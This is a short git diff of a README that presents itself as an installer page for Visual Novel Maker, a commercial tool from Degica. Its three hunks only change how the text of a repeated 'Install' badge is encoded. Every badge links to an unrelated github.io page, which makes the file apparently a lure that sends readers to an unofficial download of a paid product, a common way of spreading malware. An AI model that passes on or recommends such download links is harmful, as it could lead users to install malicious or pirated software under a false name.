@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Visual Novel Maker](https://img.shields.io/badge/⬇_Install_Visual%20Novel%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Visual Novel Maker](https://img.shields.io/badge/⬇_Install_Visual+Novel+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Visual Novel Maker is a creation tool from Degica for producing visual novel gam
 
 <div align="center">
 
-[![⬇ Install Visual Novel Maker](https://img.shields.io/badge/⬇_Install_Visual%20Novel%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Visual Novel Maker](https://img.shields.io/badge/⬇_Install_Visual+Novel+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Visual Novel Maker is a creation tool from Degica for producing visual novel gam
 
 <div align="center">
 
-[![⬇ Install Visual Novel Maker](https://img.shields.io/badge/⬇_Install_Visual%20Novel%20Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Visual Novel Maker](https://img.shields.io/badge/⬇_Install_Visual+Novel+Maker-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
